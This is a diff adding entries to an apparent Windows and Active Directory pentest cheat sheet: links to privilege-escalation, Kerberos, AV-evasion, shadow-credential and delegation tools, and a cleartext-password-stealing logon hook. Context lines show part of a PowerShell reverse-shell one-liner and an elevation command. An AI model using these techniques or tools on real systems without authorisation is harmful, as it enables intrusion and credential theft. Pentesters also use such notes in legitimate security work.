@@ -148,6 +148,10 @@ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443
 
 
 # Privilege Escalation
+## bloodyAD
+* https://github.com/CravateRouge/bloodyAD
+bloodyAD is an Active Directory privilege escalation swiss army knife
+
 ## Switch to high integrity level
 ```
 powershell.exe Start-Process cmd.exe -Verb runAs
@@ -955,6 +959,8 @@ User->Application Server: 5. Presents TGS for service enc. w. servers account
 Application Server->Domain Controller: (opt.) PAC Validation request
 Domain Controller->Application Server: (opt.) PAC Validation response
 ```
+
+Rubeus Tool for Kerberos interaction: https://github.com/GhostPack/Rubeus
 
 <details>
   <summary>Expand</summary>
@@ -2318,6 +2324,10 @@ try{
 }
 ```
 
+## BOAZ_beta
+Bypass, Obfuscate, Adapt, Zero-Trust (BOAZ)
+* https://github.com/thomasxm/BOAZ_beta
+
 # Application Whitelisting
 Using existing and trusted applications, is a technique known as "Living off the land" (LOLBAS).
 See https://lolbas-project.github.io/ (Windows equivalent of [GTFOBins](https://gtfobins.github.io/))
@@ -2540,8 +2550,28 @@ We have successfully bypassed AppLocker's PowerShell restrictions and have execu
 In addition to providing an alternative bypass method for C# code execution, this process demonstrates basic techniques which could aid future research. Discovering a bypass is not completely trivial, so we'll divide this process into a number of steps.
 
 
+# Shadow Credentials
+* pyWhisker: https://github.com/ShutdownRepo/pywhisker
+
+pyWhisker is a Python equivalent of the original Whisker made by Elad Shamir and written in C#. This tool allows users to manipulate the msDS-KeyCredentialLink attribute of a target user/computer to obtain full control over that object.
+
+# Key Logger
+* NPPSPy: https://github.com/gtworek/PSBits/blob/master/PasswordStealing/NPPSpy/NPPSPy.c
+Simple (but fully working) code for NPLogonNotify(). The function obtains logon data, including cleartext password.
 
 
+# Delegation
+* ADeleg: https://github.com/mtth-bfft/adeleg
+
+Is an Active Directory delegation management tool. It allows you to make a detailed inventory of delegations set up so far in a forest, along with their potential issues:
+
+* Objects owned by users
+* Objects with ACEs for users
+* Non canonical ACL
+* Disabled ACL inheritance
+* Default ACL modified in schema
+* Deleted delegation trustees
+ 
 
 
 
